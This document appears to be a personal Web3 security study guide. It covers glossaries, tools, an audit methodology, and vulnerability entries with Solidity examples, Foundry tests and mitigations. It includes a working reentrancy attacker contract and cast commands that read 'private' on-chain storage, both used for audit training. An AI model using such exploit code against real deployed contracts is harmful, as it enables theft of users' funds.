# Web3


## Index
- [Introduction](#introduction)
- [Web3 glossary](#web3-glossary)
- [Ethereum glossary](#ethereum-glossary)
- [DeFi Glossary](#defi-glossary)
- [Personal security](#personal-security)
- [Resources](#resources)
- [Tools](#tools)
  - [Foundry](#foundry)
  - [Slither](#slither)
  - [Code](#code)
- [Audit](#Audit)
  - [Interview process](#interview-process)
  - [Audit process](#audit-process)
  - [Audit methodology](#audit-methodology)
- [Principles of Smart Contract Design](#principles-of-smart-contract-design)
- [Vulnerabilities](#vulnerabilities)
  - [Broken Access Control](#broken-access-control)
  - [Private informations stored on-chain](#private-informations-stored-on-chain)
  - [Denial of Service (DoS)](#denial-of-service-dos)
  - [Should follow CEI](#should-follow-cei)
  - [Reentrancy](#reentrancy)
  - [Weak Randomness](#weak-randomness)
  - [Overflow](#overflow)
  - [Unsafe casting](#unsafe-casting)
  - [Mishandling of ETH](#mishandling-of-eth)
  - [Weird ERC20s](#weird-erc20s)
  - [Lack of slippage protection](#lack-of-slippage-protection)
  - [Centralization](#centralization)
  - [Failure to initialize](#failure-to-initialize)
  - [Reward manipulation](#reward-manipulation)
  - [Oracle Manipulation](#oracle-manipulation)
  - [Storage collision](#storage-collision)
  - [EVM compatibility](#evm-compatibility)
  - [Signature issues](#signature-issues)
  - [Unbounded gas consumption](#unbounded-gas-consumption)
  - [Maximal Extractable Value (MEV)](#maximal-extractable-value-mev)
  - [Governance Attack](#governance-attack)
  - [Flash Loan Attacks](#flash-loan-attacks)
  - [Web2 Attacks](#web2-attacks)
  - [Inability to handle calls with non-zero `call.value`](#inability-to-handle-calls-with-non-zero-callvalue)
- [Challenges solved](#challenges-solved)
  - [Damn Vulnerable DeFi v4](#damn-vulnerable-defi-v4)
    - [Selfie](#selfie)
    - [Puppet V2](#puppet-v2)
  - [Cyfrin CodeHawks First Flights](#cyfrin-codeHawks-first-flights)
    - [First Flight #14: AirDropper H-02. Lack of a claim verification mechanism in the function `MerkleAirdrop::claim` results in the USDC protocol balance draining](#first-flight-14-airdropper-h-02-lack-of-a-claim-verification-mechanism-in-the-function-merkleairdropclaim-results-in-the-usdc-protocol-balance-draining)
    - [First Flight #13: Baba Marta H-01. No restriction implemented in `MartenitsaToken::updateCountMartenitsaTokensOwner` allows any user to update any MartenitsaToken balance breaking the operativity and purpose of the protocol](#first-flight-13-baba-marta-h-01-no-restriction-implemented-in-martenitsatokenupdatecountmartenitsatokensowner-allows-any-user-to-update-any-martenitsatoken-balance-breaking-the-operativity-and-purpose-of-the-protocol)
    - [First Flight #13: Baba Marta M-01. `MartenitsaEvent::stopEvent` does not clear the list of partecipants not allowing recurring users to join new events](#first-flight-13-baba-marta-m-01-martenitsaeventstopevent-does-not-clear-the-list-of-partecipants-not-allowing-recurring-users-to-join-new-events)

## Introduction

The **Blockchain** is a set of technologies in which the ledger is structured as a chain of blocks containing transactions and consensus distributed on all nodes of the network. All nodes can participate in the validation process of transactions to be included in the ledger.

There are two common types of operations that are carried out to create a cryptocurrency:
- **Mining (Proof-of-Work)** Validation of transactions through the resolution of mathematical problems by miners who use hardware and software dedicated to these operations. Whoever solves the problem first wins the right to add a new block of transactions and a reward;
- **Staking (Proof-of-Staking)** consists of users who lock their tokens in a node called a validator. The validators take turns checking the transactions on the network. If they perform well, they receive a prize distributed among all the participants of the validator, otherwise, they receive a penalty.
- Read also "[What Is the Difference Between Blockchain Consensus Algorithms?](https://pixelplex.io/blog/best-blockchain-consensus-algorithms/)" by Pixelplex

**Ethereum** is a blockchain that has popularized an incredible innovation: smart contracts, which are a program or collection of code and data that reside and function in a specific address on the network. Thanks to this factor, it is defined as a "programmable blockchain".

Note: By design, smart contracts are immutable. This means that once a Smart Contract is deployed, it cannot be modified, with the exception of the [Proxy Upgrade Pattern](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies).

A token can be created with a smart contract. Most of them reside in the ERC20 category, which is fungible tokens. Other tokens are ERC-721 and ERC-1155, aka NFTs.

A **decentralized application**, also known as **DApp**, differs from other applications in that, instead of relying on a server, it uses blockchain technology. To fully interact with a DApp you need a wallet. DApps are developed both with a user-friendly interface, such as a web, mobile or even desktop app, and with a smart contract on the blockchain.

The fact that there is a user-friendly interface means that the "old vulnerabilities" can still be found. An example: If a DApp has a web interface, maybe an [XSS](https://owasp.org/www-community/attacks/xss/) on it can be found and exploited. Another evergreen is phishing, that is frequently used to steal tokens and NFTs.

The source code of the Smart Contracts is often written in **Solidity**, an object-oriented programming language. Another widely used programming language, but less than Solidity, is **Vyper** (Python).

Most of the time the smart contract code is found public in a github such as `github.com/org/project/contracts/*.sol` or you can get it from Etherscan, for example by going to the contract address (such as that of the DAI token), in the Contract tab you will find the code https://etherscan.io/address/0x6b175474e89094c44da98b954eedeac495271d0f#code and contract ABI > a json which indicates how the functions of the smart contract are called. In any case, the source is almost always public. If it's not public, you can use an EVM bytecode decompiler such as https://etherscan.io/bytecode-decompiler, just enter the contract address here.

[Bitcoin Whitepaper](https://bitcoin.org/bitcoin.pdf) | [Ethereum Whitepaper](https://ethereum.org/en/whitepaper/) | [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf)

## Web3 glossary

- **Decentralized Autonomous Organization (DAO)** A blockchain-based organization that is structured by self-enforcing smart contracts and democratically run by its users using open-source code. A vote is taken by network stakeholders on every decision.
- **Liquidity** The capacity to swap an asset without significantly changing its price and the simplicity with which an asset may be turned into cash are both examples of liquidity.
- **Oracle** A blockchain protocol receives external real-world data from Oracles, third-party information service providers. This implies that they can increase the security, veracity, and strength of the data that a blockchain network receives and make use of.

You can find more here: [Crypto Glossary | Cryptopedia](https://www.gemini.com/cryptopedia/glossary)

## Ethereum glossary

- **application binary interface (ABI)** The standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interactions.
- **bytecode** An abstract instruction set designed for efficient execution by a software interpreter or a virtual machine. Unlike human-readable source code, bytecode is expressed in numeric format.
- **Ethereum Improvement Proposal (EIP)** A design document providing information to the Ethereum community, describing a proposed new feature or its processes or environment.
- **Ethereum Request for Comments (ERC)** A label given to some EIPs that attempt to define a specific standard of Ethereum usage.
- **Ethereum Virtual Machine (EVM)** is a complex, dedicated software virtual stack that executes contract bytecode and is integrated into each entire Ethereum node. Simply said, EVM is a software framework that allows developers to construct Ethereum-based decentralized applications (DApps).
- **hard fork** A permanent divergence in the blockchain; also known as a hard-forking change. One commonly occurs when nonupgraded nodes can't validate blocks created by upgraded nodes that follow newer consensus rules. Not to be confused with a fork, soft fork, software fork, or Git fork.
- **wei** The smallest denomination of ether. 1018 wei = 1 ether.

You can find more here: [ethereum.org/en/glossary/](https://ethereum.org/en/glossary/)<br/>
See also: [Ethereum 101 - by Rajeev | Secureum](https://secureum.substack.com/p/ethereum-101)

## DeFi Glossary

- **DEX (Decentralized Exchange)**: DEX facilitates peer-to-peer trading of digital assets without intermediaries, using smart contracts on blockchain platforms like Ethereum.
- **AMM (Automated Market Maker)**: AMM algorithmically determines asset prices and facilitates trading using liquidity pools, where users provide assets for trading against.
- **Liquidity Provider**: Liquidity Providers contribute assets to decentralized exchange liquidity pools, enabling trading and receiving a share of transaction fees.
- **Dutch Auction**: In Dutch Auctions, the price of assets starts high and decreases until a buyer accepts, commonly used for token sales on blockchain platforms.
- **Batch Auction**: Batch Auctions collect and execute multiple orders simultaneously at set intervals, enhancing liquidity and fairness in decentralized exchange trading.
- **Arbitrage**: When you take advantage of a price discrepancy on two exchanges

You can find more here: [DeFi Glossary | yearn.fi](https://docs.yearn.fi/resources/defi-glossary)

## Personal security

- Store your assets in a **cold wallet** (hardware wallet) instead of a hot wallet (Centralized exchanges or CEXs). Some good examples are [Ledger](https://www.ledger.com/) and [Trezor](https://trezor.io/);
- Keep your **seedphrase** in a safe place and don't share it with anyone. If possible, use a solution like [Zeus from Cryptotag](https://cryptotag.io/products/zeus-starter-kit/);
- Use 2FA, use a password manager (like [KeePass](https://keepass.info/)), double check links and be aware of phishing, read [Five OpSec Best Practices to Live By](https://www.threatstack.com/blog/five-opsec-best-practices-to-live-by).
- Read also [The Ultimate Self Custody Guide by Webacy](https://www.linkedin.com/pulse/ultimate-self-custody-guide-webacy-maika-isogawa/)

**Other interesting resources**
- [What is market cap?](https://www.coinbase.com/learn/crypto-basics/what-is-market-cap)
- [Khan Academy: Options, swaps, futures, MBSs, CDOs, and other derivatives](https://www.khanacademy.org/economics-finance-domain/core-finance/derivative-securities)

## Resources

**Code**
- [Clean Contracts - a guide on smart contract patterns & practices](https://www.useweb3.xyz/guides/clean-contracts)
- [Ethereum VM (EVM) Opcodes](https://www.evm.codes/)
- [Coinbase Solidity Style Guide](https://github.com/coinbase/solidity-style-guide)

**Security**
- [All known smart contract-side and user-side attacks and vulnerabilities in Web3.0, DeFi, NFT and Metaverse + Bonus](https://telegra.ph/All-known-smart-contract-side-and-user-side-attacks-and-vulnerabilities-in-Web30--DeFi-03-31)
- [Web3 Security Library | Immunefi](https://github.com/immunefi-team/Web3-Security-Library)
- [Smart Contract Security](https://ethereum.org/en/developers/docs/smart-contracts/security/)
- [Ethereum Smart Contract Security Best Practices](https://consensys.github.io/smart-contract-best-practices/)

**Public reports**
- [Solodit](https://solodit.xyz/)
- [Blockchain Security Audit List](https://github.com/0xNazgul/Blockchain-Security-Audit-List)

**Newsletters / Updates / News**
- [rekt.news](https://rekt.news/)
- [Blockchain Threat Intelligence](https://newsletter.blockthreat.io/)

**YouTube channels**
- [Andy Li](https://www.youtube.com/@andyli)
- [Patrick Collins](https://www.youtube.com/@PatrickAlphaC)
- [Owen Thurm](https://www.youtube.com/@0xOwenThurm)

**Bounties**
- [Daily Warden](https://www.dailywarden.com/)
- [Immunefi](https://immunefi.com/)
- [HackenProof](https://hackenproof.com/)

### Specific resources

**Lending/Borrowing protocols**
- [Lending/Borrowing DeFi Attacks](https://dacian.me/lending-borrowing-defi-attacks)

**ORACLE based protocols**
- [Vader Protocol Findings & Analysis Report | Cod4rena](https://code4rena.com/reports/2021-04-vader)

## Tools

**Blockchain exploration**
- [Metamask](https://metamask.io/)
- [Etherscan.io](https://etherscan.io/)
- [Bitquery](https://explorer.bitquery.io/)

**Development Environment**
- [Visual Studio Code](https://code.visualstudio.com/) / [VSCodium](https://vscodium.com/)
    - [Solidity](https://marketplace.visualstudio.com/items?itemName=NomicFoundation.hardhat-solidity)
    - [Even Better TOML](https://marketplace.visualstudio.com/items?itemName=tamasfe.even-better-toml)
    - [Live Server](https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer)
    - Note: remember to activate `Format on save`
- [Hardhat](https://hardhat.org/)
    - [Configuration | Hardhat](https://hardhat.org/hardhat-runner/docs/config)
- [Foundry](https://book.getfoundry.sh/)
- A web browser + [MetaMask](https://metamask.io/)

**Static Analyzers**
- [Slither](https://github.com/crytic/slither)
- [Aderyn](https://github.com/Cyfrin/aderyn)
- [c4udit](https://github.com/byterocket/c4udit)
- [4naly3er](https://github.com/Picodes/4naly3er)
- [SolidityInspector](https://github.com/seeu-inspace/solidityinspector)

**Libraries**

- [web3.js](https://web3js.readthedocs.io/) web3.js is very useful for interacting with a smart contract and its APIs. Install it by using the command `npm install web3`. To use it in Node.js and interact with a contract, use the following commands:
    ```jsx
     1: node;
     2: const Web3 = require('web3');
     3: const URL = "http://localhost:8545"; //This is the URL where the contract is deployed, insert the url from Ganache
     4: const web3 = new Web3(URL);
     5: accounts = web3.eth.getAccounts();
     6: var account;
     7: accounts.then((v) => {(this.account = v[1])});
     8: const address = "<CONTRACT_ADDRESS>"; //Copy and paste the Contract Address
     9: const abi = "<ABI>"; //Copy and paste the ABI of the Smart Contract
    10: const contract = new web3.eth.Contract(abi, address).
    ```
    
- [ethers](https://docs.ethers.org/) ethers is a JavaScript library for interacting with Ethereum blockchain and smart contracts. It provides a simple, lightweight interface for making calls to smart contracts, sending transactions, and listening for events on the Ethereum network. Install it with the command `npm install ethers`. An example:
    ```jsx
    // === settings ===
    require('dotenv').config();
    const ethers = require('ethers');
    
    //const provider = new ethers.providers.JsonRpcProvider('GANACHE-URL'); // Ganache, or
    //const provider = new ethers.providers.InfuraProvider('goerli', INFURA_API_KEY); // Infura, or
    const provider = new ethers.providers.AlchemyProvider('goerli','TESTNET_ALCHEMY_KEY'); //Alchemy
    
    const wallet = new ethers.Wallet('TESTNET_PRIVATE_KEY', provider);
    
    const contractAddress = 'CONTRACT_ADDRESS';
    const abi = 'ABI';
    
    // === interact with a smart contract ===
    
    async function interactWithContract() {
    
      const contract = new ethers.Contract(
        contractAddress, 
        abi, 
        wallet
      );
    
      const result = await contract.SMART_CONTRACT_FUNCTION();
      console.log(result);
      
    } interactWithContract();
    
    // === sign a transaction ===
    
    async function signTransaction() {
    
      // transaction details
      const toAddress = "DEST-ADDRESS";
      const value = ethers.utils.parseEther("1.0");
      const gasLimit = 21000;
      const nonce = 0;
    
      const tx = {
        to: toAddress,
        value: value,
        gasLimit: gasLimit,
        nonce: nonce
      };
    
      const signedTx = await wallet.sign(tx);
      const transactionHash = await provider.sendTransaction(signedTx);
      console.log(transactionHash);
      
    } signTransaction();
    ```


### Foundry

This cheatsheet it's an extension of the default usage guide from [foundry](https://book.getfoundry.sh/). See also [Foundry Cheatcodes](https://book.getfoundry.sh/forge/cheatcodes).

**Usage**
```shell
# Build
$ forge build

# Test
$ forge test
$ forge test --debug
$ forge test --mt test_myTest -vvv

# Coverage
$ forge coverage

# Format
$ forge fmt

# Gas Snapshots
$ forge snapshot

# See methods of a contract
$ forge inspect <CONTRACT-NAME> methods

# Anvil
$ anvil

# Deploy
$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
$ forge script script/Counter.s.sol:CounterScript --rpc-url $RPC_URL --account defaultKey --sender <sender_address> --broadcast -vvvv

# Cast
$ cast <subcommand>

# Cast verify functions
$ cast sig "function()"
$ cast --calldata-decode "function()" 0xa3ei7e7b # when a function has data

# Smart Contract interactions
$ cast send <smart_contract_address> "<function(uint256)>" <input> --rpc-url $RPC_URL --account defaultKey
$ cast call <smart_contract_address> "<view_function()>"
$ cast --to-base <interaction_output> dec

# Init a new project
$ forge init
$ forge install ChainAccelOrg/foundry-devops --no-commit
$ forge install OpenZeppelin/openzeppelin-contracts --no-commit
$ forge install OpenZeppelin/openzeppelin-contracts-upgradeable --no-commit
$ forge install transmissions11/solmate Openzeppelin/openzeppelin-contracts
# for foundry.toml `remappings = ['@openzeppelin/contracts=lib/openzeppelin-contracts/contracts']`

# Help
$ forge --help
$ anvil --help
$ cast --help
```


### Slither

```shell
# Basic usage
$ slither .

# Exclude libraries
$ slither . --exclude-dependencies

# More checks
$ slither-check-upgradeability project/contract.sol ContractName  # > project can be a Solidity file, or a platform (truffle/embark/..) directory
$ slither-check-erc project/contract.sol ContractName
```

### Code

If you need to find some text in the smart contracts, you can use these commands
```bash
grep -r --include="*.sol" "word_to_search" .
find . -type f -name "*.sol" -exec grep -H -E "word1|word2" {} +
grep -rE "\b0x[a-fA-F0-9]{40}\b" --include="*.sol" .              # search for hardcoded addresses in sol files
```

Below, some pieces of code that might be useful
```Solidity
/* Convert a given address into uint */
function addressToUint(address _address) public pure returns (uint256) {
	return uint256(uint160(_address));
}

/* Base Foundry test */
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Contract} from "../src/Contract.sol";

contract Contract is Test {
    function setUp() public {
        
    }
}
```

## Audit

### Interview process

Two guides / checklists to follow to see if the code is ready for an audit:

- [simple-security-toolkit](https://github.com/nascentxyz/simple-security-toolkit)
- [The Rekt Test](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/)
- [A Comprehensive Smart Contract Audit Readiness Guide](https://learn.openzeppelin.com/security-audits/readiness-guide)

### Audit process

The smart contract audit process can be briefly summed up in these steps:

1. **Get Context**: Understand the project, its purpose and its unique aspects.
2. **Use Tools**: Employ relevant tools to scan and analyze the codebase.
3. **Manual Reviews**: Make a personal review of the code and spot out unusual or vulnerable code.
4. **Write a Report**: Document all findings and recommendations for the development team.

Low level → **The Three Phases of a Security Review**

1. Initial Review
a. Scoping
b. Reconnaissance
c. Vulnerability identification
d. Reporting
2. Protocol fixes
a. Fixes issues
b. Retests and adds tests
3. Mitigation Review
a. Reconnaissance
b. Vulnerability identification
C. Reporting

### Audit methodology

1. Git clone the repository in local enviorment + disable `ffi` if needed
2. Read the documentation
3. Create a scope table with: name file, lines of code, if you have audited or not. You can use notion for this, as it enables you to create an interactive spreadsheet. For example, you can rank the contracts based on complexity.
    - A cool tool for this purpose is [Solidity Code Metrics](https://github.com/Consensys/solidity-metrics)
4. Look at the code, see how you can break it
    - Take notes, in the code and in a file `.md`
      - Use markers like `@audit`, `@audit-info`, `@audit-ok`, `@audit-issue`
    - Don’t get stuck in rabbit holes
    - Use Foundry to write tests, especially if some are missing. Also run chisel to understand what some portions of code do
    - Look at the docs again to see if everything is correct, which functions might be more vulnerable etc.



## Principles of Smart Contract Design

How to reduce the probability of introducing vulnerabilities in the codebase:
- Less code
  - Less code can potentially mean fewer bugs
  - It also reduces audit costs, as audit firms charge based on SLOC (Source Lines of Code)
  - One way to achieve this is by being very selective with the storage variables you create
  - Also consider: how much of the logic can be done off-chain?
- Be cautious about using loops
  - They can often cause DoS (Denial of Service) issues
  - In any case, they can increase the gas costs
- Limit expected inputs
- Handle all possible cases
  - Examples: a stablecoin depegs, insolvent liquidations
- Use parallel data structures
  - If necessary and/or possible, use EnumerableMapping, EnumerableSet



## Vulnerabilities

### Broken Access Control

**Example**: A function should be `onlyOwner` but it isn’t

The `PasswordStore::setPassword` function is set to be an `external` function, however the natspec of the function and overall purpose of the smart contract is that `This function allows only the owner to set a new password`.

```solidity
function setPassword(string memory newPassword) external {
        // @audit - no access control
        s_password = newPassword;
        emit SetNetPassword();
    }
```

Add this test to the `PasswordStore.t.sol` test suite.

```solidity
function test_everyone_can_set_password(address randomAddress) public {
    vm.assume(randomAddress != owner); // This to make sure that randomAddress is not the owner
    vm.startPrank(randomAddress); // Address of a random user
    string memory expectedPassword = "newPassword";
    passwordStore.setPassword(expectedPassword); // randomAddress changes the password

    vm.startPrank(owner); // Only the owner can call getPassword, so we will use it to verify that the change has been made
    string memory actualPassword = passwordStore.getPassword();
    assertEq(actualPassword, expectedPassword); // This would pass if address(1) effectly changed the password
}
```

**Mitigation (for this scenario)**:  Add an access control modifier to the `setPassword` function like `onlyOwner` or add the following code at the beginning of the function

```solidity
if (msg.sender != s_owner) {
	revert PasswordStore__NotOwner();
}
```

### Private informations stored on-chain

**Example**: `s_password` stored on chain set as `private` and thought to be really private (see PasswordStore)

1. Create a locally running chain

```bash
make anvil
```

1. Deploy the contract on chain

```bash
make deploy
```

1. Grab the contract address and the RPC URL (in case of anvil it's [http://127.0.0.1:8545](http://127.0.0.1:8545/)). Run the storage tool. Note: we use `1` because that is the slot for the storage variable of `s_password`.

```bash
cast storage <ADDRESS-HERE> 1 --rpc-url <RPC-URL-HERE>
```

1. Grab the output of the command. Convert it to a string by running the following command. In my case it looked like this `0x6d7950617373776f726400000000000000000000000000000000000000000014` that converted is `myPassword`.

```bash
cast parse-bytes32-string <PREVIOUS-OUTPUT>
```

**Mitigation (for this scenario)**: Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the password. However, you'd also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with the password that decrypts your password.

### Denial of Service (DoS)

**Example:** loops increase the gas needed to interact with a function, making it more expensive overtime and at some point unusable

```solidity
function enter() public {
        // Check for duplicate entrants
        for (uint256 i; i < entrants.length; i++) {
            if (entrants[i] == msg.sender) {
                revert("You've already entered!");
            }
        }
        entrants.push(msg.sender);
    }
```

Add this test to the `Contract.t.sol` test suite

```solidity
address warmUpAddress = makeAddr("warmUp");
address personA = makeAddr("A");
address personB = makeAddr("B");
address personC = makeAddr("C");

function test_denialOfService() public {
        // We want to warm up the storage stuff
        vm.prank(warmUpAddress);
        dos.enter();

        uint256 gasStartA = gasleft();
        vm.prank(personA);
        dos.enter();
        uint256 gasCostA = gasStartA - gasleft();

        uint256 gasStartB = gasleft();
        vm.prank(personB);
        dos.enter();
        uint256 gasCostB = gasStartB - gasleft();
        
        for(uint256 i = 0; i < 1000; i++){
	        vm.prank(address(uint160(i)));
	        dos.enter();
        }

        uint256 gasStartC = gasleft();
        vm.prank(personC);
        dos.enter();
        uint256 gasCostC = gasStartC - gasleft();

        console2.log("Gas cost A: %s", gasCostA);
        console2.log("Gas cost B: %s", gasCostB);
        console2.log("Gas cost C: %s", gasCostC);

        // The gas cost will just keep rising, making it harder and harder for new people to enter!
        assert(gasCostC > gasCostB);
        assert(gasCostB > gasCostA);
    }
```

#### Mitigation

It depends on the scenario, an example for Puppy Raffle NFT: https://www.codehawks.com/report/clo383y5c000jjx087qrkbrj8#M-01

#### Notes

1. Remember: a DoS at core means to block a function / contract from executing when it really needs to do so
2. Look for unbounded loops, a loop that seemingly does not have a defined limit, or a limit that can increase / grow. An example: `for(uint256 i = 0; i < users.lenght; i++){…}` where there is no limit to users on the protocol
3. Another example: a liquidation if it needs to happen, it should happen no matter what. So check to see if it’s possible for a transfer to fail and revert (this for DeFi)
4. Check if there is the possibility for an external call to fail
    1. Sending Ether to a contract that does not accept it
    2. Calling a function that does not exist
    3. The external function runs out of gas
    4. Third-party contract malicious

### Should follow CEI

Indipendently from the function, CEI should always be followed. The severity dependes on what can be achieved (see Reentrancy)

### Reentrancy

An example:

```solidity
contract ReentrancyVictim {
    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];
        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

        // State change
        userBalance[msg.sender] = 0;
    }
}
```

Contract of the attacker (maybe test it on Remix)

```solidity
contract ReentrancyAttacker {
    ReentrancyVictim victim;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}
```

Using Foundry to prove it

```solidity
function test_reenter() public {
        // User deposits 5 ETH
        vm.prank(victimUser);
        victimContract.deposit{value: amountToBeDeposited}();

        // We assert the user has their balance
        assertEq(victimContract.userBalance(victimUser), amountToBeDeposited);

        // // Normally, the user could now withdraw their money if they like
        // vm.prank(victimUser);
        // victimContract.withdrawBalance();

        // But... we get attacked!
        vm.prank(attackerUser);
        attackerContract.attack{value: 1 ether}();

        assertEq(victimContract.userBalance(victimUser), amountToBeDeposited);
        assertEq(address(victimContract).balance, 0);

        vm.prank(victimUser);
        vm.expectRevert();
        victimContract.withdrawBalance();
    }
```

#### Mitigation

→ Follow CEI: Check Effects Interaction (other patterns are CEII or FRE-PI)

→ Put a lock in the function, like the following code at the beginning of the function

```solidity
bool locked
function withdrawFunction() public {
	if(locked){revert();}
	locked = true;
...
}
```

→ Use [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) from OpenZeppelin: https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard

#### Notes

→ See this PoC: https://www.codehawks.com/report/clo383y5c000jjx087qrkbrj8#H-02

→ Reentrancy for NFTs: https://www.codehawks.com/finding/clvge72wm000stmgh7yrwcpbt

→ To check also: [A Historical Collection of Reentrancy Attacks](https://github.com/pcaversaccio/reentrancy-attacks)

### Weak Randomness

This happens every time in the contract is used something other than an Oracle to enstablish randomness. The purpose of the random number rapresent the severity of the issue.

- For example: if the random value is used to mint a rare NFT, it’s an high severity issue
- See: https://github.com/immunefi-team/Web3-Security-Library/tree/main/Vulnerabilities#bad-randomness

Vulnerable contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

// Inspired by https://github.com/crytic/slither/wiki/Detector-Documentation#weak-prng

contract WeakRandomness {
    /*
     * @notice A fair random number generator
     */
    function getRandomNumber() external view returns (uint256) {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp)));
        return randomNumber;
    }
}

// prevrandao security considerations: https://eips.ethereum.org/EIPS/eip-4399
```

Proof of Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {WeakRandomness} from "../../src/weak-randomness/WeakRandomness.sol";

contract WeakRandomnessTest is Test {
    WeakRandomness public weakRandomness;

    function setUp() public {
        weakRandomness = new WeakRandomness();
    }

    // For this test, a user could just deploy a contract that guesses the random number...
    // by calling the random number in the same block!!
    function test_guessRandomNumber() public {
        uint256 randomNumber = weakRandomness.getRandomNumber();

        assertEq(randomNumber, weakRandomness.getRandomNumber());
    }
}
```

#### Mitigation

- Chainlink VRF (the most popular solution)
- Commit Reveal Scheme

#### Notes

- Case study: [Understanding the Meebits Exploit](https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281)

### Overflow

→ See: https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/arithmetic/OverflowAndUnderflow.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js

→ This happens if it’s an older version of solidity, or the value is `unchecked`

→ Use chisel to see how much an uint can store

```solidity
$ chisel
-> type(uint64).max
```

#### Mitigation

- Remove `unchecked` if it’s present
- Usa a more recent version of solidity
- Bigger uints, for example from `uint64` to `uint256`
- Use SafeMath https://docs.openzeppelin.com/contracts/2.x/api/math

### Unsafe casting

**Scenario**

```solidity
uint64 totalFees = 0;
uint256 fee = 0
totalFees = 0 + uint64(fee);
```

This creates problem as the max value for `uint64` is `18446744073709551615` while for `uint256` is `115792089237316195423570985008687907853269984665640564039457584007913129639935`.

What will happen is that if the value of `fee` is bigger than the max value accepted for uint64, the difference will be lost.

In this scenario, if fee value is bigger than `18.446744073709551615` ETH, any value after it will be lost.

You can try it with chisel:

```solidity
$ chisel

➜ type(uint256).max
Type: uint256
├ Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
├ Hex (full word): 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
└ Decimal: 115792089237316195423570985008687907853269984665640564039457584007913129639935
➜ type(uint64).max
Type: uint64
├ Hex: 0xffffffffffffffff
├ Hex (full word): 0x000000000000000000000000000000000000000000000000ffffffffffffffff
└ Decimal: 18446744073709551615

/* 
   Adding the maximum value for uint256 to uint64, notice how the difference is lost
   once reached the max capacity for uint64
 */

➜ uint64 myUint = uint64(type(uint256).max);
➜ myUint
Type: uint64
├ Hex: 0xffffffffffffffff
├ Hex (full word): 0x000000000000000000000000000000000000000000000000ffffffffffffffff
└ Decimal: 18446744073709551615

/* What happens if I cast 20 ETH in uint64? */

➜ uint256 twentyEth = 20e18;
➜ uint64 myUint = uint64(twentyEth);
➜ myUint
Type: uint64
├ Hex: 0x158e460913d00000
├ Hex (full word): 0x000000000000000000000000000000000000000000000000158e460913d00000
└ Decimal: 1553255926290448384

/* 
   Notice how the result is 1.553255926290448384 ETH
   resulting in a loss of almost 18.5 ETH
*/
```

### Mishandling of ETH

A couple of examples are:

- Not using push over pull
- Vulnerable to selfdestruct: we can use `selfdestruct` from a malicious contract to force send ETH to a contract that doesn’t have a fallback and receive functions. If that contract does have some assertion based on the balance, this will break those assertion, breaking the contract. [An example](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).

If you see something like `require(address(this).balance == something)`, you should check for mishandling of ETH

→ Case study: [Two Rights Might Make A Wrong](https://samczsun.com/two-rights-might-make-a-wrong/)

### Weird ERC20s

→ Keep in mind that not every ERC20 follows the standard, an example is UDST

→ USDC is another example since it implements a proxy. That means that if the devs intend to modify it, you should handle it

Fee on transfer tokens
- [M-03 Deposits don’t work with fee-on transfer tokens | Reality Cards (round 2)](https://code4rena.com/reports/2021-08-realitycards#m-03-deposits-dont-work-with-fee-on-transfer-tokens)
- [Vault is Not Compatible with Fee Tokens and Vaults with Such Tokens Could Be Exploited](https://github.com/code-423n4/2022-05-cally-findings/issues/61)

Resources
- [Weird ERC20 Tokens](https://github.com/d-xo/weird-erc20)
- [Token Integration Checklist](https://secure-contracts.com/development-guidelines/token_integration.html)


### Lack of slippage protection

→ In swap protocols, the protocol can’t just swap for the market price, this would be vulnerable to the continue change in price

→ If the market conditions change before the transaction process, the user could get a much worse swap

→ See: https://uniswapv3book.com/milestone_3/slippage-protection.html

### Centralization

Most of the time, for competitive audits, this would be marked as a known issue or no issue. However, for a private audit, you should always report it. This especially if it’s behind a proxy, at least to cover yourself from any responsability.

→ An example of an hack: [UK Court Ordered Oasis to Exploit Own Security Flaw to Recover 120k wETH Stolen in Wormhole Hack](https://medium.com/@observer1/uk-court-ordered-oasis-to-exploit-own-security-flaw-to-recover-120k-weth-stolen-in-wormhole-hack-fcadc439ca9d).

### Failure to initialize

A scenario is when there are initializer functions where somebody else can also call them. For example.

Check:

- [FailureToInitialize.sol](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/failure-to-initialize/FailureToInitialize.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
- [I accidentally killed it](https://github.com/openethereum/parity-ethereum/issues/6995)

### Reward manipulation

